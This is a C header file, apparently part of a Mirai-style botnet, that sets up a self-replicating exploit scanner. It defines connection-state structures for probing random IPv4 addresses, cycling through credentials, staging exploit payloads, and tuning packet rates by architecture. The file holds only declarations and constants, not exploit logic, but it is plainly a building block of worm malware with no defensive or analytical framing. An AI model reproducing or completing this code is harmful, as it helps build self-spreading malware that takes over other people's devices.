#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef X86_64
#define EXPLOIT_SCANNER_MAX_CONNS 512
#define EXPLOIT_SCANNER_RAW_PPS 1440
#else
#define EXPLOIT_SCANNER_MAX_CONNS 128
#define EXPLOIT_SCANNER_RAW_PPS 160
#endif
#ifdef X86_64
#define EXPLOIT_SCANNER_RDBUF_SIZE 1024
#define EXPLOIT_SCANNER_HACK_DRAIN 64
#else
#define EXPLOIT_SCANNER_RDBUF_SIZE 256
#define EXPLOIT_SCANNER_HACK_DRAIN 64
#endif

struct exploit_scanner_connection
{
    int fd, last_recv;
    enum
    {
        EXPLOIT_SC_CLOSED,
        EXPLOIT_SC_CONNECTING,
        EXPLOIT_SC_GET_CREDENTIALS,
        EXPLOIT_SC_EXPLOIT_STAGE2,
        EXPLOIT_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[EXPLOIT_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[2560], payload_buf2[2560];
    int credential_index;
};

void exploit_init();
void exploit_kill(void);

static void exploit_setup_connection(struct exploit_scanner_connection *);
static ipv4_t get_random_ip(void);

#endif

